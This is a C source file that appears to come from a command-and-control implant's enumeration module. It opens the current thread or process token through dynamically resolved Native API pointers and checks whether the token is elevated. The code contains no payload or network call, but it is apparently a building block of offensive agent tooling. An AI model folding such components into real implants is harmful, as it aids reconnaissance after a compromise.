#include "../../headers/enumeration/token.h"

HANDLE TokenCurrentHandle() {
    HANDLE   Token = NULL;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;

    if (!NT_SUCCESS(NtStatus = agent->apis->pNtOpenThreadToken(NtCurrentThread(), TOKEN_QUERY, TRUE, &Token)))
    {
        if (NtStatus != STATUS_NO_TOKEN)
        {
            //PRINTF("NtOpenThreadToken: Failed:[%08x : %ld]\n", NtStatus, Instance->Win32.RtlNtStatusToDosError(NtStatus));
            //NtSetLastError(Instance->Win32.RtlNtStatusToDosError(NtStatus));
            return NULL;
        }

        if (!NT_SUCCESS(NtStatus = agent->apis->pNtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &Token)))
        {
            //PRINTF("NtOpenProcessToken: Failed:[%08x : %ld]\n", NtStatus, Instance->Win32.RtlNtStatusToDosError(NtStatus));
            //NtSetLastError(Instance->Win32.RtlNtStatusToDosError(NtStatus));
            return NULL;
        }
    }

    return Token;
}

BOOL TokenElevated( IN HANDLE Token) {
    TOKEN_ELEVATION Data = { 0 };
    DWORD           Size = sizeof(TOKEN_ELEVATION);
    BOOL            Admin = FALSE;

    if (NT_SUCCESS(agent->apis->pNtQueryInformationToken(Token, TokenElevation, &Data, Size, &Size))) {
        Admin = Data.TokenIsElevated;
    }

    return Admin;
}

